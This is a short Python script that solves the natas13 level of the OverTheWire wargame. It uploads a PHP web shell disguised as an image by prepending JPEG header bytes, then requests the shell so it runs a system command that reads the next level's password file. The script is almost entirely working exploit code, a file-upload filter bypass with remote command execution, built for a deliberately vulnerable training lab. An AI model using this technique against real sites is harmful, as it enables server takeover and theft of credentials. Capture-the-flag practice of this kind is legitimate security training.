"""
Help script to resolve natas challenge #13
"""
import requests
import json
import re

level = 'natas13'
url = 'http://{}.natas.labs.overthewire.org'.format(level)

with open('natas.json') as j:
    credentials = json.load(j)
auth = (level, credentials[level])
del credentials

"""
Same as the previous level, but this time the data type is checked.
We can trick the system by appending an EXIF header to our PHP file.
"""

response = requests.post(url, auth=auth,
                         data={'filename': 'something.php'},
                         files={'uploadedfile': b'\xff\xd8\xff\xe0<?php system("cat /etc/natas_webpass/natas14"); ?>'})
# The response contains the name of the uploaded file.
match = re.search(r'"(upload/\w+\.php)"', response.text)
filename = match.groups()[0]
print(filename)

response = requests.get('/'.join([url, filename]), auth=auth)
print(response.text)
